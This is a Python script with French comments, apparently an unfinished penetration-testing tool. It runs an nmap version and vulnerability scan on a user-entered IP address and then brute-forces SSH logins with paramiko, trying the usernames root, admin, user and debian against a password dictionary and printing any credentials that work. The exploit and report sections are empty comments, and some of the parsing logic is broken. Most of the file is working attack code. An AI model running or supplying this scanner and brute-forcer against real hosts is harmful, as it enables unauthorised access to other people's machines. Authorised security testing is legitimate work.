#Ce script permet de faire un test d'intrusion sur une machine distante, il prend comme argument l'adresse IP de la machine distante, et appele les scripts bruteforcesshmdp.py, nmap.py et les exploit compatible afin de rédiger un rapport de test d'intrusion dans un fichier json.
import subprocess
import paramiko
import sys

# Lance le script qui installera les dépendances

subprocess.call(["python3", "dependencies.py"])

# Demande a l'utilisateur d'entrer l'adresse IP de la machine distante
ip_address = input("Enter the IP address to scan: ")

def run_nmap_scan(ip_address):
    # Lance un scan Nmap sur la machine distante
    output = subprocess.check_output(["nmap", "-p-", "-sV", "--script", "vulners", ip_address])
    
    # Sort les ports ouverts, les services et les CVEs
    open_ports = []
    services = {}
    cves = []
    
    lines = output.decode().splitlines()
    for line in lines:
        if "open" in line and "tcp" in line:
            port = line.split("/")[0]
            open_ports.append(port)
        elif "open" in line and "udp" in line:
            port = line.split("/")[0]
            open_ports.append(port)
        elif "Service Info" in line:
            service = line.split(":")[1].strip()
            services[port] = service
        elif "CVE" in line:
            cve = line.split(":")[1].strip()
            cves.append(cve)
    
    return open_ports, services, cves

# Perform the Nmap scan
open_ports, services, cves = run_nmap_scan(ip_address)

# Affiche les résultats du scan a l'écran
print("Open ports:", open_ports)
print("Services:", services)
print("CVEs:", cves)


# Effectue un bruteforce sur le service SSH

def brute_force_ssh(ip):
    usernames = ["debian", "root", "user", "admin"]
    
    with open("dictionary.txt", "r") as f:
        passwords = f.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(ip, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                return
            except paramiko.AuthenticationException:
                continue
    
    print("Attack unsuccessful")

# Call the brute_force_ssh function with the provided IP address
brute_force_ssh(ip_address)

#appel des exploits compatibles

#rédaction du rapport de test d'intrusion dans un fichier json